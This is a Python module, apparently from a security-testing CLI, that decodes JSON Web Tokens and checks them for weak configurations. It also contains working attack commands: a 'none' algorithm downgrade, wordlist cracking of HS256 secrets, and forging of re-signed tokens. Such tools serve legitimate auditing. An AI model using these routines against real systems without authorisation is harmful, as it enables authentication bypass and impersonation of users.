from __future__ import annotations
import base64
import json
import time
from typing import Optional

import jwt as pyjwt
import typer
from rich.syntax import Syntax

from probe.utils.display import print_panel, console as rich_console, print_finding
from probe.utils.wordlist import load_wordlist

app = typer.Typer(help="JWT decode, analysis, and attacks")


def _b64decode_part(part: str) -> dict:
    padded = part + "=" * (4 - len(part) % 4)
    try:
        return json.loads(base64.urlsafe_b64decode(padded))
    except Exception as e:
        raise ValueError(f"Cannot decode JWT part: {e}")


def decode_jwt(token: str) -> tuple[dict, dict]:
    parts = token.strip().split(".")
    if len(parts) != 3:
        raise ValueError("Invalid JWT format — expected 3 dot-separated parts")
    return _b64decode_part(parts[0]), _b64decode_part(parts[1])


def check_jwt(token: str) -> list[dict]:
    findings = []
    try:
        header, payload = decode_jwt(token)
    except ValueError as e:
        return [{"type": "parse_error", "severity": "HIGH", "detail": str(e)}]

    alg = header.get("alg", "").lower()
    if alg == "none":
        findings.append({"type": "alg_none", "severity": "CRITICAL",
                          "detail": "Algorithm is 'none' — token not verified"})
    if alg == "hs256":
        try:
            pyjwt.decode(token, "", algorithms=["HS256"])
            findings.append({"type": "empty_secret", "severity": "CRITICAL",
                              "detail": "Token verifies with empty secret"})
        except Exception:
            pass

    exp = payload.get("exp")
    if exp and exp < time.time():
        findings.append({"type": "expired", "severity": "MEDIUM",
                          "detail": f"Token expired at {exp}"})

    if not exp:
        findings.append({"type": "no_expiry", "severity": "LOW",
                          "detail": "Token has no expiration (exp) claim"})

    return findings


def none_attack(token: str) -> str:
    _, payload = decode_jwt(token)
    new_header = {"alg": "none", "typ": "JWT"}
    def enc(d): return base64.urlsafe_b64encode(json.dumps(d, separators=(",", ":")).encode()).rstrip(b"=").decode()
    return f"{enc(new_header)}.{enc(payload)}."


def crack_jwt(token: str, wordlist_path: str) -> Optional[str]:
    words = load_wordlist(wordlist_path)
    for word in words:
        try:
            pyjwt.decode(token, word, algorithms=["HS256"])
            return word
        except pyjwt.exceptions.InvalidSignatureError:
            continue
        except Exception:
            continue
    return None


def forge_jwt(token: str, secret: str) -> str:
    _, payload = decode_jwt(token)
    return pyjwt.encode(payload, secret, algorithm="HS256")


@app.command("decode")
def cmd_decode(token: str):
    """Decode and display JWT header and payload."""
    try:
        header, payload = decode_jwt(token)
        rich_console.print(Syntax(json.dumps(header, indent=2), "json", theme="monokai"))
        rich_console.print(Syntax(json.dumps(payload, indent=2), "json", theme="monokai"))
    except ValueError as e:
        rich_console.print(f"[red]{e}[/red]")
        raise typer.Exit(1)


@app.command("check")
def cmd_check(token: str):
    """Run security checks on a JWT."""
    findings = check_jwt(token)
    if not findings:
        rich_console.print("[green]No obvious vulnerabilities found[/green]")
    for f in findings:
        print_finding(f)


@app.command("none")
def cmd_none(token: str):
    """Attempt none-algorithm attack."""
    result = none_attack(token)
    print_panel("none-alg token", result)


@app.command("crack")
def cmd_crack(
    token: str,
    wordlist: str = typer.Option(..., "--wordlist", "-w"),
):
    """Brute-force JWT secret against a wordlist."""
    rich_console.print("[cyan]Cracking JWT secret...[/cyan]")
    result = crack_jwt(token, wordlist)
    if result:
        print_panel("Secret Found", f"[green]{result}[/green]")
    else:
        rich_console.print("[red]Secret not found[/red]")


@app.command("forge")
def cmd_forge(token: str, secret: str = typer.Option(..., "--secret")):
    """Forge a new JWT with a known secret."""
    result = forge_jwt(token, secret)
    print_panel("Forged Token", result)
